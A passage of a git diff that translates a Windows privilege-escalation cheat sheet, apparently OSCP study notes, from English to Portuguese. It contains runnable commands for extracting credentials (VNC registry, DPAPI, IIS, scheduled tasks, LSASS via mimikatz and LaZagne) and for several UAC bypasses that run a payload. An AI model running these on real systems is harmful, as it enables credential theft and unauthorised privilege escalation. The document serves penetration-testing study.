 Get-ChildItem -Path "C:\Program Files" -Recurse -Filter "*.config" -ErrorAction SilentlyContinue | 
   Select-String -Pattern "password|pwd|secret" | Select-Object Path, Line
 ```
 
-### VNC & Remote Tools Credentials
+### Credenciais de VNC e Ferramentas Remotas
 
-> Extract VNC password
+> Extrair senha do VNC
 
 ```powershell
 reg query "HKCU\Software\RealVNC\vncserver" /v Password
 
-# If encrypted, extract from registry binary
+# Se criptografada, extrair do registro binário
 $key = (Get-ItemProperty 'HKCU:\Software\RealVNC\vncserver').Password
-# Decrypt with known VNC key algorithm
+# Descriptografar com algoritmo conhecido do VNC
 ```
 
-> TightVNC stored password
+> Senha armazenada do TightVNC
 
 ```powershell
 reg query "HKCU\Software\TightVNC" /s
 ```
 
-> UltraVNC password
+> Senha do UltraVNC
 
 ```powershell
 reg query "HKCU\Software\UltraVNC" /s
 ```
 
-### DPAPI Protected Credentials Decryption
+### Descriptografia de Credenciais Protegidas por DPAPI
 
-> Find DPAPI protected data
+> Encontrar dados protegidos por DPAPI
 
 ```powershell
 Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 ```
 
-> Decrypt with DPAPI (if user session)
+> Descriptografar com DPAPI (se houver sessão do usuário)
 
 ```powershell
 Add-Type -AssemblyName System.Security
 $dpapi = New-Object System.Security.Cryptography.DataProtectionScope
-$encryptedBytes = [Convert]::FromBase64String("BASE64_ENCRYPTED_STRING")
+$encryptedBytes = [Convert]::FromBase64String("STRING_CRIPTOGRAFADA_BASE64")
 $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, $dpapi.CurrentUser)
 [System.Text.Encoding]::Unicode.GetString($decryptedBytes)
 ```
 
-### IIS Credentials Extraction
+### Extração de Credenciais do IIS
 
-> Dump IIS AppPool credentials
+> Dump de credenciais AppPool do IIS
 
 ```powershell
-# Get AppPool identity
+# Obter identidade AppPool
 Get-WmiObject IIsApplicationPool -Namespace 'root\microsoftiis' | Select-Object Name, AppPoolIdentity
 
-# Extract from IIS metabase
+# Extrair da metabase do IIS
 type "C:\Windows\System32\inetsrv\MetaBase.xml" | findstr /S "password"
 ```
 
-> Check IIS logs for credential leaks
+> Verificar logs do IIS por vazamento de credenciais
 
 ```powershell
 type "C:\inetpub\logs\LogFiles\W3SVC1\*" | findstr "password|pwd|user="
 ```
 
-### Task Scheduler Credential Dumps
+### Dump de Credenciais via Task Scheduler
 
-> List scheduled tasks and owners
+> Listar tarefas agendadas e proprietários
 
 ```powershell
 Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "NT AUTHORITY\SYSTEM"} | 
-  Select-Object TaskName, @{N="User";E={$_.Principal.UserId}}
+  Select-Object TaskName, @{N="Usuario";E={$_.Principal.UserId}}
 ```
 
-> Extract task XML (may contain embedded credentials)
+> Extrair XML da tarefa (pode conter credenciais embutidas)
 
 ```powershell
-$task = Get-ScheduledTask -TaskName "TaskName"
+$task = Get-ScheduledTask -TaskName "NomeDaTarefa"
 Export-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath | Out-File task.xml
 type task.xml | findstr "password"
 ```
 
-### WinRM/Remote Execution Credentials
+### Credenciais WinRM/Execução Remota
 
-> Check WinRM trusted hosts
+> Verificar hosts confiáveis do WinRM
 
 ```powershell
 Get-WSManCredSSP
 ```
 
-> List cached Kerberos tickets
+> Listar tickets Kerberos em cache
 
 ```powershell
 klist
 klist tickets
 ```
 
-> Dump credentials from LSASS (requires SYSTEM)
+> Dump de credenciais do LSASS (requer SYSTEM)
 
 ```powershell
-# Using mimikatz
+# Usando mimikatz
 mimikatz # sekurlsa::logonpasswords
 
-# Or use LaZagne
+# Ou usar LaZagne
 .\LaZagne.exe all
 ```
 
 ---
 
-## UAC Bypass
+## Bypass de UAC
 
-> User Account Control bypass techniques for privilege escalation from medium to high integrity
+> Técnicas de bypass do User Account Control para escalação de médio para alto nível de integridade
 
-### Check UAC Status
+### Verificar Status do UAC
 
 ```cmd
-:: Check UAC settings
+:: Verificar configurações do UAC
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
 ```
 
-| ConsentPromptBehaviorAdmin | Description |
+| ConsentPromptBehaviorAdmin | Descrição |
 |---------------------------|-------------|
-| 0 | No prompt (UAC disabled for admins) |
-| 1 | Prompt on secure desktop |
-| 2 | Prompt (not secure desktop) |
-| 5 | Default - Prompt for non-Windows binaries |
+| 0 | Sem prompt (UAC desativado para admins) |
+| 1 | Prompt na área de trabalho segura |
+| 2 | Prompt (sem área de trabalho segura) |
+| 5 | Padrão — Prompt para binários não-Windows |
 
-### Fodhelper UAC Bypass
+### Bypass UAC via Fodhelper
 
-> Works on Windows 10, requires local admin in Administrators group
+> Funciona no Windows 10, requer usuário local admin no grupo Administrators
 
 ```cmd
-:: Set registry key to execute our payload
+:: Definir chave de registro para executar nosso payload
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\shell.exe" /f
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
 
-:: Trigger the bypass
+:: Disparar o bypass
 fodhelper.exe
 
-:: Cleanup
+:: Limpeza
 reg delete HKCU\Software\Classes\ms-settings /f
 ```
 
-### Eventvwr UAC Bypass
+### Bypass UAC via Eventvwr
 
-> Works on Windows 7/8/10
+> Funciona no Windows 7/8/10
 
 ```cmd
-:: Set registry key
+:: Definir chave de registro
 reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Windows\Temp\shell.exe" /f
 
-:: Trigger the bypass
+:: Disparar o bypass
 eventvwr.exe
 
-:: Cleanup
+:: Limpeza
 reg delete HKCU\Software\Classes\mscfile /f
 ```
 
-### ComputerDefaults UAC Bypass
+### Bypass UAC via ComputerDefaults
 
 ```cmd
-:: Set registry key
+:: Definir chave de registro
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c C:\Windows\Temp\shell.exe" /f
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
 
-:: Trigger
+:: Disparar
 computerdefaults.exe
 
-:: Cleanup
+:: Limpeza
 reg delete HKCU\Software\Classes\ms-settings /f
 ```
 
-### UACME Tool
+### Ferramenta UACME
 
 > <https://github.com/hfiref0x/UACME>
 
 ```cmd
-:: Use method 23 (fodhelper)
+:: Usar método 23 (fodhelper)
 Akagi64.exe 23 C:\Windows\Temp\shell.exe
 
-:: Use method 33 (sdclt)
+:: Usar método 33 (sdclt)
 Akagi64.exe 33 C:\Windows\Temp\shell.exe
 ```
 
-### PowerShell Bypass Script
+### Script PowerShell de Bypass
 
 ```powershell
-# Fodhelper bypass
+# Bypass via Fodhelper
 function Invoke-FodhelperBypass {
-    param([string]$Command)
+    param([string]$Comando)
     
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Comando -Force
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Force
     
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
@@ -991,18 +991,18 @@ function Invoke-FodhelperBypass {
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 }
 
-# Usage
-Invoke-FodhelperBypass -Command "cmd.exe /c C:\Windows\Temp\shell.exe"
+# Uso
+Invoke-FodhelperBypass -Comando "cmd.exe /c C:\Windows\Temp\shell.exe"
 ```
 
 ---
 
-## See Also
+## Veja Também
 
-- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - AD-specific privilege escalation paths
-- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Kerberoasting, ASREPRoast, Golden/Silver tickets
-- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - NTLM relay and Responder attacks
-- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - mimikatz, LaZagne, credential extraction
-- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Move after escalation
-- **[Ligolo-ng Pivoting](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** - Tunnel through compromised machines
-- **[OSCP Exam Guide - Windows PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md#phase-3-privilege-escalation---windows-15-นาที)** - Quick reference
+- **[Exploração AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** — Caminhos de escalação de privilégios específicos do AD
+- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** — Kerberoasting, ASREPRoast, Golden/Silver tickets
+- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** — NTLM relay e ataques com Responder
+- **[Ataques de Senha](../3.AD-Exploit/3.2.Password-Attacks.md)** — mimikatz, LaZagne, extração de credenciais
+- **[Movimentação Lateral](../5.Lateral-Movement/5.1.Lateral-Movement.md)** — Mover após escalação
+- **[Pivoting com Ligolo-ng](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** — Tunnel via máquinas comprometidas
+- **[Guia do Exame OSCP - Windows PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** — Referência rápida
